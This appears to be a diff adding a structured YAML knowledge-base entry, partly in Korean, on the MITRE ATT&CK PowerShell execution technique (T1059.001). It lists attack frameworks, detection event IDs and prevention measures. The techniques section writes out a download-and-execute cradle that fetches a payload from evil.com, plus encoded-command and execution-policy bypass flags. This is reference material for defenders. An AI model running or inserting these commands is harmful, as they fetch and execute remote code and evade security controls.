@@ -1,0 +1,108 @@
+# GR Atom: PowerShell
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "ATK-MITRE-T1059-001"
+  name: "PowerShell"
+  normalization:
+    normalized_name: "powershell command scripting interpreter execution"
+    normalization_version: "1.0"
+  aliases:
+    - "PowerShell Execution"
+    - "파워쉘 공격"
+    - "Living off the Land"
+
+classification:
+  domain: security
+  type: attack_technique
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags: ["ATK", "MITRE", "EXECUTION"]
+
+definition:
+  what: |
+    Windows PowerShell을 사용하여 명령을 실행하고
+    스크립트를 통해 악성 활동을 수행하는 기법이다.
+  why: |
+    시스템 기본 도구로 탐지를 회피한다.
+    강력한 기능으로 다양한 공격을 수행한다.
+  how: |
+    1. PowerShell 실행
+    2. 실행 정책 우회
+    3. 페이로드 실행
+    4. 후속 단계 진행
+
+relations:
+  structural:
+    is_a:
+      - "ATK-MITRE-T1059-001"
+    related_to:
+      - "ATK-MITRE-T1027-001"
+      - "ATK-MITRE-T1218-001"
+
+properties:
+  technical:
+    mitre_id: "T1059.001"
+    tactic: "Execution"
+    common_techniques:
+      download_execute:
+        name: "Download Cradle"
+        command: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+      encoded_command:
+        name: "Base64 인코딩"
+        command: "powershell -enc [base64]"
+      bypass_execution_policy:
+        command: "powershell -ep bypass"
+      amsi_bypass:
+        name: "AMSI 우회"
+        purpose: "안티바이러스 회피"
+    obfuscation_tools:
+      - "Invoke-Obfuscation"
+      - "Invoke-CradleCrafter"
+      - "ISE-Steroids"
+    frameworks:
+      - "PowerSploit"
+      - "Empire"
+      - "Nishang"
+      - "PowerShell Mafia"
+    detection:
+      - "PowerShell Logging (모듈, 스크립트 블록)"
+      - "Event ID 4103, 4104"
+      - "AMSI 통합"
+      - "CLM (Constrained Language Mode)"
+    prevention:
+      - "PowerShell v2 비활성화"
+      - "스크립트 블록 로깅"
+      - "AMSI 활성화"
+      - "AppLocker/WDAC"
+      - "Just Enough Administration"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "MITRE ATT&CK T1059.001"
+      - "Microsoft PowerShell Security"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+  ai:
+    embedding_text: |
+      PowerShell(T1059.001)은 Windows 기본 도구로
+      악성 명령을 실행하는 MITRE ATT&CK Execution 기법이다.
+    search_keywords:
+      - "PowerShell"
+      - "T1059.001"
+      - "Execution"
+      - "Living off the Land"
